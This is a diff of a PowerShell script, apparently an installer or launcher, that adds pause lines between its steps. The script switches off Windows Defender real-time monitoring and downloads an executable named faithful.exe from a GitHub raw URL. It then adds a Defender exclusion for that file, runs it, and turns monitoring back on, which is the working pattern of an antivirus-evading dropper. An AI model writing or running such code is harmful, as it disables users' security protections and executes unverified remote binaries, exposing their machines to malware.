@@ -20,12 +20,20 @@ if (!
 }
 
 cd $env:userprofile
+pause
 Set-MpPreference -DisableRealtimeMonitoring $true
+pause
 Write-Output "Starting script..."
+pause
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
+pause
 Write-Output "Adding Windows Defender exclusion..."
+pause
 Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
+pause
 Start-Process ("faithful.exe")
+pause
 Set-MpPreference -DisableRealtimeMonitoring $false
+pause
 Write-Output "Done!"
 pause
